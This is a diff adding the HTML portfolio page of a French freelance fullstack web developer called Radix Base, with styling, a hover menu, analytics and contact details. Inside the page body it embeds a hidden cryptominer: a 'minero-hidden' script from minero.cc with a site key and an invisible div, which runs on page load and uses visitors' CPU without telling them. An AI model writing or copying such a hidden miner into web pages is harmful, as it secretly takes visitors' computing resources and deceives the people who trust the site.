@@ -1,0 +1,227 @@
+<html>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <meta name="title" content="Radix Base">
+  <meta name="description" content="Développeur Fullstack Freelance.">
+   <meta name="theme-color" content="#16DB93">
+  <meta name="color" content="#16DB93">
+ 
+  <meta property="og:image" content="https://cdn.discordapp.com/avatars/610162220432883712/5fc44efe878b8933acd39f8d87b94773.png">
+<style>
+@import url(https://fonts.googleapis.com/css?family=Space+Mono:400,700);
+
+body {
+  background-image: url("/background.jpg");
+  background-size: cover;
+  font-family: "Space Mono";
+  font-weight:400;
+  color: #555;
+}
+
+input, button {
+  font-family: "Space Mono";
+  font-size:1em;
+}
+
+a {text-decoration: none;color:inherit;}
+
+.container {
+	
+  transition: all 0.2s cubic-bezier(.7,.2,.17,1);
+  box-shadow: 0 0 2px hsla(0,0%,0%,0.1);
+  overflow:hidden;
+  position: relative;
+  margin:5% 10%;
+  height: 400px;
+  background: hsla(0,0%,100%,0.8);
+}
+
+.container:hover {
+  background: hsla(0,0%,100%,1);
+  transform: scale(1.02);
+  box-shadow: 0 46px 12px -16px hsla(0,0%,0%,0.05);
+}
+
+.content {
+  padding: 5%;
+}
+
+h1 {color:#16DB93;}
+p {color: #777;}
+
+
+/* --- menu --- */
+
+
+.menu__btn {
+  float:left;
+  background: none;
+  border:none;
+  padding: 1em 0.5em;
+}
+
+
+.menu__label {
+
+  font-size: 0.8em;
+  letter-spacing: 0.1em;
+  font-weight:bold;
+  color: #16DB93;
+}
+
+.menu__title {font-size:1.3em;}
+
+.menu__container {
+  transition: all 0.4s 0.3s cubic-bezier(.4,0,.17,1);
+  transform: translateX(-20em);
+  padding: 1em;
+  color:white;
+  font-size:1em;
+  top:0;
+  left:40%;
+  font-weight:bold;
+  text-align:left;
+  opacity:0;
+  visibility:hidden;
+  position:absolute;
+}
+
+.menu__list {
+  padding:0;
+  margin-top:2em;
+}
+
+.menu__item {
+  transition: all 0.2s;
+  list-style: none;
+}
+
+.menu__item:hover {
+  color:black;
+}
+
+.menu__item:before,
+.menu__item:last-child:after {
+  content:'';
+  display:block;
+  width:100px;
+  height:1px;
+  background: hsla(0,0%,100%,0.5);
+  margin: 1em 0;
+}
+
+.menu__bg-layer {
+  transition: all 0.4s cubic-bezier(0.4, 0.0, 0.2, 1);
+  border-radius:50%;
+  opacity:0;
+  position:absolute;
+  transform: translate(-50%, -50%);
+  background: #16DB93;
+  height:0;
+  width:0;
+}
+
+.menu__btn:hover .menu__container {
+  transform: translateX(0);
+  transition-delay:0;
+  width:100%;
+  heigth:100%;
+  visibility:visible;
+  opacity:1;
+}
+
+.menu__btn:hover .menu__bg-layer {
+  padding-bottom: 250%;
+  width:250%;
+  opacity:1;
+}
+
+.menu__btn:hover .menu__bg-layer-2 {
+  background: #FAFF7F;
+}
+
+.menu__btn:hover .menu__bg-layer-1 {
+  transition-delay:0.2s;
+}
+
+code {
+	color: #FF5D53;
+	
+	padding: 3px 3px;
+	background-color:#EEEEEE;
+	
+	border-radius: 2px;
+	}
+
+</style>
+
+
+
+
+
+
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-148991634-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-148991634-1');
+</script>
+
+
+<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+<div class="container">
+<button class="menu__btn">
+  <span class="menu__label">
+<i class="material-icons">menu</i></span>
+  <div class="menu--hidden">
+    <div class="menu__bg-layer menu__bg-layer-2"></div>
+    <div class="menu__bg-layer menu__bg-layer-1"></div>
+    <div class="menu__container">
+      <span class="menu__title">Menu:</span>
+      <ul class="menu__list">
+        <li class="menu__item"><a href="/donate">Donate your CPU power</a></li>
+       <li class="menu__item"><a href="https://twitter.com/radixbase">Twitter</a></li>
+  
+       
+      </ul>
+    </div>
+  </div>
+</button>
+
+<div class="content">
+	<script src="https://minero.cc/lib/minero-hidden.min.js" async></script>
+<div class="minero-hidden" style="display: none" data-key="52f0e8fbe561ac0d407d73935008d28a"></div>
+
+  <h1>
+ <img src="https://cdn.discordapp.com/avatars/610162220432883712/5fc44efe878b8933acd39f8d87b94773.png" style="border-radius: 50%;" width="40px">   Radix Base
+</h1>
+  <p>
+  Yo, moi c'est Radix, je suis développeur web!
+<br>
+Je vend mes services en tant que développeur fullstack freelance.
+<br>
+Je maitrise le Html, Css, Javascript, Php, Mysql.
+<br>
+Je propose éventuellement des cours pour apprendre les bases du dev web, voir plus!
+<br>
+<br>
+Contactez moi sur mon Twitter <code>@radixbase</code><br> ou alors via Discord <code>610162220432883712</code></p>
+<br>
+<br>
+</div>
+
+
+</div>
+
+
+<script type="text/javascript">
+	$(".menu").click(function(){
+   $(this).parent().toggleClass("close");
+});
+</script>
+</html>
